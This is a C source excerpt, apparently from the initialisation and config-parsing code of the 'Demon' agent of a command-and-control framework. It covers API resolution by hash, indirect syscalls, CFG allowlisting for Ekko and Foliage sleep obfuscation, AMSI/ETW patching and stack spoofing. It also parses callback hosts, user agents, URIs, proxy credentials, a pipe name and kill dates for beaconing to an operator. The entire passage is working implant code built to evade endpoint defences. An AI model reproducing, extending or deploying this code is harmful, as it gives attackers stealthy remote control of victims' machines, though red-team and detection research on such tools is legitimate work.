        ((INSTANCE *)Instance)->Win32.GetFileAttributesW              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETFILEATTRIBUTESW );
        ((INSTANCE *)Instance)->Win32.FindFirstFileW                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_FINDFIRSTFILEW );
        ((INSTANCE *)Instance)->Win32.FindNextFileW                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_FINDNEXTFILEW );
        ((INSTANCE *)Instance)->Win32.FindClose                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_FINDCLOSE );
        ((INSTANCE *)Instance)->Win32.FileTimeToSystemTime            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_FILETIMETOSYSTEMTIME );
        ((INSTANCE *)Instance)->Win32.SystemTimeToTzSpecificLocalTime = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_SYSTEMTIMETOTZSPECIFICLOCALTIME );
        ((INSTANCE *)Instance)->Win32.RemoveDirectoryW                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_REMOVEDIRECTORYW );
        ((INSTANCE *)Instance)->Win32.DeleteFileW                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_DELETEFILEW );
        ((INSTANCE *)Instance)->Win32.CreateDirectoryW                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATEDIRECTORYW );
        ((INSTANCE *)Instance)->Win32.CopyFileW                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_COPYFILEW );
        ((INSTANCE *)Instance)->Win32.MoveFileExW                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_MOVEFILEEXW );
        ((INSTANCE *)Instance)->Win32.SetCurrentDirectoryW            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_SETCURRENTDIRECTORYW );
        ((INSTANCE *)Instance)->Win32.Wow64DisableWow64FsRedirection  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_WOW64DISABLEWOW64FSREDIRECTION );
        ((INSTANCE *)Instance)->Win32.Wow64RevertWow64FsRedirection   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_WOW64REVERTWOW64FSREDIRECTION );
        ((INSTANCE *)Instance)->Win32.GetModuleHandleA                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETMODULEHANDLEA );
        ((INSTANCE *)Instance)->Win32.GetSystemTimeAsFileTime         = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETSYSTEMTIMEASFILETIME );
        ((INSTANCE *)Instance)->Win32.GetLocalTime                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETLOCALTIME );
        ((INSTANCE *)Instance)->Win32.DuplicateHandle                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_DUPLICATEHANDLE );
        ((INSTANCE *)Instance)->Win32.AttachConsole                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_ATTACHCONSOLE );
        ((INSTANCE *)Instance)->Win32.WriteConsoleA                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_WRITECONSOLEA );
        ((INSTANCE *)Instance)->Win32.GlobalFree                      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GLOBALFREE );
    }

    /* now that we loaded some of the basic apis lets parse the config and see how we load the rest */
    /* Parse config */
    DemonConfig();

    /* now do post init stuff after parsing the config */
    if ( ((INSTANCE *)Instance)->Config.Implant.SysIndirect )
    {
        /* Initialize indirect syscalls + get SSN from every single syscall we need */
        if  ( ! SysInitialize( ((INSTANCE *)Instance)->Modules.Ntdll ) ) {
            PUTS( "Failed to Initialize syscalls" )
            /* NOTE: the agent is going to keep going for now. */
        }
    }

    /* shuffle array */
    ShuffleArray( RtModules, SIZEOF_ARRAY( RtModules ) );

    /* load all modules */
    for ( int i = 0; i < SIZEOF_ARRAY( RtModules ); i++ )
    {
        /* load module */
        if ( ! ( ( BOOL (*)() ) RtModules[ i ] ) () ) {
            PUTS( "Failed to load a module" )
            return;
        }
    }

    if ( KArgs )
    {
#if SHELLCODE
        ((INSTANCE *)Instance)->Session.ModuleBase = KArgs->Demon;
        ((INSTANCE *)Instance)->Session.ModuleSize = KArgs->DemonSize;
        ((INSTANCE *)Instance)->Session.TxtBase = KArgs->TxtBase;
        ((INSTANCE *)Instance)->Session.TxtSize = KArgs->TxtSize;
        FreeReflectiveLoader( KArgs->KaynLdr );
#endif
    }
    else
    {
        ((INSTANCE *)Instance)->Session.ModuleBase = ModuleInst;

        /* if ModuleBase has not been specified then lets use the current process one */
        if ( ! ((INSTANCE *)Instance)->Session.ModuleBase ) {
            /* if we specified nothing as our ModuleBase then this either means that we are an exe or we should use the whole process */
            ((INSTANCE *)Instance)->Session.ModuleBase = LdrModulePeb( 0 );
        }

        if ( ((INSTANCE *)Instance)->Session.ModuleBase ) {
            ((INSTANCE *)Instance)->Session.ModuleSize = IMAGE_SIZE( ((INSTANCE *)Instance)->Session.ModuleBase );
        }
    }

#if _WIN64
    ((INSTANCE *)Instance)->Session.OS_Arch      = PROCESSOR_ARCHITECTURE_AMD64;
    ((INSTANCE *)Instance)->Session.Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
#else
    ((INSTANCE *)Instance)->Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    ((INSTANCE *)Instance)->Session.OS_Arch      = PROCESSOR_ARCHITECTURE_UNKNOWN;
    if ( ProcessIsWow( NtCurrentProcess() ) ) {
        ((INSTANCE *)Instance)->Session.OS_Arch  = PROCESSOR_ARCHITECTURE_AMD64;
    } else {
        ((INSTANCE *)Instance)->Session.OS_Arch  = PROCESSOR_ARCHITECTURE_INTEL;
    }
#endif

    ((INSTANCE *)Instance)->Session.PID       = U_PTR( ((INSTANCE *)Instance)->Teb->ClientId.UniqueProcess );
    ((INSTANCE *)Instance)->Session.TID       = U_PTR( ((INSTANCE *)Instance)->Teb->ClientId.UniqueThread );
    ((INSTANCE *)Instance)->Session.Connected = FALSE;
    ((INSTANCE *)Instance)->Session.AgentID   = RandomNumber32();
    ((INSTANCE *)Instance)->Config.AES.Key    = NULL; /* TODO: generate keys here  */
    ((INSTANCE *)Instance)->Config.AES.IV     = NULL;

    /* Linked lists */
    ((INSTANCE *)Instance)->Tokens.Vault       = NULL;
    ((INSTANCE *)Instance)->Tokens.Impersonate = FALSE;
    ((INSTANCE *)Instance)->Jobs               = NULL;
    ((INSTANCE *)Instance)->Downloads          = NULL;
    ((INSTANCE *)Instance)->Sockets            = NULL;
    ((INSTANCE *)Instance)->HwBpEngine         = NULL;
    ((INSTANCE *)Instance)->Packages           = NULL;

    /* Global Objects */
    ((INSTANCE *)Instance)->Dotnet = NULL;

    /* if cfg is enforced (and if sleep obf is enabled)
     * add every address we're going to use to the Cfg address list
     * to not raise an exception while performing sleep obfuscation */
    if ( CfgQueryEnforced() )
    {
        PUTS( "Adding required function module &addresses to the cfg list"  );

        /* common functions */
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll,    ((INSTANCE *)Instance)->Win32.NtContinue );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll,    ((INSTANCE *)Instance)->Win32.NtSetContextThread );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll,    ((INSTANCE *)Instance)->Win32.NtGetContextThread );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Advapi32, ((INSTANCE *)Instance)->Win32.SystemFunction032 );

        /* ekko sleep obf */
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Kernel32, ((INSTANCE *)Instance)->Win32.WaitForSingleObjectEx );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Kernel32, ((INSTANCE *)Instance)->Win32.VirtualProtect );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll,    ((INSTANCE *)Instance)->Win32.NtSetEvent );

        /* foliage sleep obf */
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll, ((INSTANCE *)Instance)->Win32.NtTestAlert );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll, ((INSTANCE *)Instance)->Win32.NtWaitForSingleObject );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll, ((INSTANCE *)Instance)->Win32.NtProtectVirtualMemory );
        CfgAddressAdd( ((INSTANCE *)Instance)->Modules.Ntdll, ((INSTANCE *)Instance)->Win32.RtlExitUserThread );
    }

    PRINTF( "Instance DemonID => %x\n", ((INSTANCE *)Instance)->Session.AgentID )
}

VOID DemonConfig()
{
    PARSER Parser = { 0 };
    PVOID  Buffer = NULL;
    ULONG  Temp   = 0;
    UINT32 Length = 0;
    DWORD  J      = 0;

    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )

    ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
    RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );

    ((INSTANCE *)Instance)->Config.Sleeping = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Jitter   = ParserGetInt32( &Parser );
    PRINTF( "Sleep: %d (%d%%)\n", ((INSTANCE *)Instance)->Config.Sleeping, ((INSTANCE *)Instance)->Config.Jitter )

    ((INSTANCE *)Instance)->Config.Memory.Alloc   = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Memory.Execute = ParserGetInt32( &Parser );

    PRINTF(
        "[CONFIG] Memory: \n"
        " - Allocate: %d  \n"
        " - Execute : %d  \n",
        ((INSTANCE *)Instance)->Config.Memory.Alloc,
        ((INSTANCE *)Instance)->Config.Memory.Execute
    )

    Buffer = ParserGetBytes( &Parser, &Length );
    ((INSTANCE *)Instance)->Config.Process.Spawn64 = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, Length );
    MemCopy( ((INSTANCE *)Instance)->Config.Process.Spawn64, Buffer, Length );

    Buffer = ParserGetBytes( &Parser, &Length );
    ((INSTANCE *)Instance)->Config.Process.Spawn86 = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, Length );
    MemCopy( ((INSTANCE *)Instance)->Config.Process.Spawn86, Buffer, Length );

    PRINTF(
        "[CONFIG] Spawn: \n"
        " - [x64] => %ls  \n"
        " - [x86] => %ls  \n",
        ((INSTANCE *)Instance)->Config.Process.Spawn64,
        ((INSTANCE *)Instance)->Config.Process.Spawn86
    )

    ((INSTANCE *)Instance)->Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Implant.SleepJmpBypass     = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
#ifdef TRANSPORT_HTTP
    ((INSTANCE *)Instance)->Config.Implant.DownloadChunkSize  = 0x80000; /* 512k */
#else
    ((INSTANCE *)Instance)->Config.Implant.DownloadChunkSize  = 0xfc00; /* 63k, needs to be less than PIPE_BUFFER_MAX */
#endif

    PRINTF(
        "[CONFIG] Sleep Obfuscation: \n"
        " - Technique: %d \n"
        " - Stack Dup: %s \n"
        "[CONFIG] ProxyLoading: %d\n"
        "[CONFIG] SysIndirect : %s\n"
        "[CONFIG] AmsiEtwPatch: %d\n",
        ((INSTANCE *)Instance)->Config.Implant.SleepMaskTechnique,
        ((INSTANCE *)Instance)->Config.Implant.StackSpoof ? "TRUE" : "FALSE",
        ((INSTANCE *)Instance)->Config.Implant.ProxyLoading,
        ((INSTANCE *)Instance)->Config.Implant.SysIndirect ? "TRUE" : "FALSE",
        ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch
    )

#ifdef TRANSPORT_HTTP
    ((INSTANCE *)Instance)->Config.Transport.KillDate       = ParserGetInt64( &Parser );
    PRINTF( "KillDate: %d\n", ((INSTANCE *)Instance)->Config.Transport.KillDate )
    // check if the kill date has already passed
    if ( ((INSTANCE *)Instance)->Config.Transport.KillDate && GetSystemFileTime() >= ((INSTANCE *)Instance)->Config.Transport.KillDate )
    {
        // refuse to run
        // TODO: exit process?
        ((INSTANCE *)Instance)->Win32.RtlExitUserThread( 0 );
    }
    ((INSTANCE *)Instance)->Config.Transport.WorkingHours   = ParserGetInt32( &Parser );

    Buffer = ParserGetBytes( &Parser, &Length );
    ((INSTANCE *)Instance)->Config.Transport.Method = MmHeapAlloc( Length + sizeof( WCHAR ) );
    MemCopy( ((INSTANCE *)Instance)->Config.Transport.Method, Buffer, Length );

    ((INSTANCE *)Instance)->Config.Transport.HostRotation   = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Transport.HostMaxRetries = 0;  /* Max retries. 0 == infinite retrying
                                                    * TODO: add this to the yaotl language and listener GUI */
    ((INSTANCE *)Instance)->Config.Transport.Hosts = NULL;
    ((INSTANCE *)Instance)->Config.Transport.Host  = NULL;

    /* J contains our Hosts counter */
    J = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Hosts [%d]\n:", J )
    for ( int i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        Temp   = ParserGetInt32( &Parser );

        PRINTF( " - %ls:%ld\n", Buffer, Temp )

        /* if our host address is longer than 0 then lets use it. */
        if ( Length > 0 ) {
            /* Add parse host data to our linked list */
            HostAdd( Buffer, Length, Temp );
        }
    }
    ((INSTANCE *)Instance)->Config.Transport.NumHosts = HostCount();
    PRINTF( "Hosts added => %d\n", ((INSTANCE *)Instance)->Config.Transport.NumHosts )

    /* Get Host data based on our host rotation strategy */
    ((INSTANCE *)Instance)->Config.Transport.Host = HostRotation( ((INSTANCE *)Instance)->Config.Transport.HostRotation );
    PRINTF( "Host going to be used is => %ls:%ld\n", ((INSTANCE *)Instance)->Config.Transport.Host->Host, ((INSTANCE *)Instance)->Config.Transport.Host->Port )

    // Listener Secure (SSL)
    ((INSTANCE *)Instance)->Config.Transport.Secure = ParserGetInt32( &Parser );
    PRINTF( "[CONFIG] Secure: %s\n", ((INSTANCE *)Instance)->Config.Transport.Secure ? "TRUE" : "FALSE" );

    // UserAgent
    Buffer = ParserGetBytes( &Parser, &Length );
    ((INSTANCE *)Instance)->Config.Transport.UserAgent = MmHeapAlloc( Length + sizeof( WCHAR ) );
    MemCopy( ((INSTANCE *)Instance)->Config.Transport.UserAgent, Buffer, Length );
    PRINTF( "[CONFIG] UserAgent: %ls\n", ((INSTANCE *)Instance)->Config.Transport.UserAgent );

    // Headers
    J = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Transport.Headers = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Headers [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        ((INSTANCE *)Instance)->Config.Transport.Headers[ i ] = MmHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( ((INSTANCE *)Instance)->Config.Transport.Headers[ i ], 0, Length );
        MemCopy( ((INSTANCE *)Instance)->Config.Transport.Headers[ i ], Buffer, Length );
#ifdef DEBUG
        PRINTF( "  - %ls\n", ((INSTANCE *)Instance)->Config.Transport.Headers[ i ] );
#endif
    }
    ((INSTANCE *)Instance)->Config.Transport.Headers[ J + 1 ] = NULL;

    // Uris
    J = ParserGetInt32( &Parser );
    ((INSTANCE *)Instance)->Config.Transport.Uris = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
    PRINTF( "[CONFIG] Uris [%d]:\n", J );
    for ( INT i = 0; i < J; i++ )
    {
        Buffer = ParserGetBytes( &Parser, &Length );
        ((INSTANCE *)Instance)->Config.Transport.Uris[ i ] = MmHeapAlloc( Length + sizeof( WCHAR ) );
        MemSet( ((INSTANCE *)Instance)->Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
        MemCopy( ((INSTANCE *)Instance)->Config.Transport.Uris[ i ], Buffer, Length );
#ifdef DEBUG
        PRINTF( "  - %ls\n", ((INSTANCE *)Instance)->Config.Transport.Uris[ i ] );
#endif
    }
    ((INSTANCE *)Instance)->Config.Transport.Uris[ J + 1 ] = NULL;

    // check if proxy connection is enabled
    ((INSTANCE *)Instance)->Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
    if ( ((INSTANCE *)Instance)->Config.Transport.Proxy.Enabled )
    {
        PUTS( "[CONFIG] [PROXY] Enabled" );
        Buffer = ParserGetBytes( &Parser, &Length );
        ((INSTANCE *)Instance)->Config.Transport.Proxy.Url = MmHeapAlloc( Length + sizeof( WCHAR ) );
        MemCopy( ((INSTANCE *)Instance)->Config.Transport.Proxy.Url, Buffer, Length );
        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", ((INSTANCE *)Instance)->Config.Transport.Proxy.Url );

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            ((INSTANCE *)Instance)->Config.Transport.Proxy.Username = MmHeapAlloc( Length );
            MemCopy( ((INSTANCE *)Instance)->Config.Transport.Proxy.Username, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", ((INSTANCE *)Instance)->Config.Transport.Proxy.Username );
        }
        else
            ((INSTANCE *)Instance)->Config.Transport.Proxy.Username = NULL;

        Buffer = ParserGetBytes( &Parser, &Length );
        if ( Length > 0 )
        {
            ((INSTANCE *)Instance)->Config.Transport.Proxy.Password = MmHeapAlloc( Length );
            MemCopy( ((INSTANCE *)Instance)->Config.Transport.Proxy.Password, Buffer, Length );
            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", ((INSTANCE *)Instance)->Config.Transport.Proxy.Password );
        }
        else
            ((INSTANCE *)Instance)->Config.Transport.Proxy.Password = NULL;
    }
    else
    {
        PUTS( "[CONFIG] [PROXY] Disabled" );
    }
#endif

#ifdef TRANSPORT_SMB

    Buffer = ParserGetBytes( &Parser, &Length );
    ((INSTANCE *)Instance)->Config.Transport.Name = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, Length );
    MemCopy( ((INSTANCE *)Instance)->Config.Transport.Name, Buffer, Length );

    PRINTF( "[CONFIG] PipeName: %ls\n", ((INSTANCE *)Instance)->Config.Transport.Name );

    ((INSTANCE *)Instance)->Config.Transport.KillDate = ParserGetInt64( &Parser );
    PRINTF( "KillDate: %d\n", ((INSTANCE *)Instance)->Config.Transport.KillDate )
    // check if the kill date has already passed
    if ( ((INSTANCE *)Instance)->Config.Transport.KillDate && GetSystemFileTime() >= ((INSTANCE *)Instance)->Config.Transport.KillDate )
    {
        // refuse to run
        // TODO: exit process?
        ((INSTANCE *)Instance)->Win32.RtlExitUserThread(0);
    }
    ((INSTANCE *)Instance)->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
#endif

    ((INSTANCE *)Instance)->Config.Implant.ThreadStartAddr = ((INSTANCE *)Instance)->Win32.LdrLoadDll + 0x12; /* TODO: default -> change that or make it optional via builder or profile */
    ((INSTANCE *)Instance)->Config.Inject.Technique        = INJECTION_TECHNIQUE_SYSCALL;

    ParserDestroy( &Parser );
}
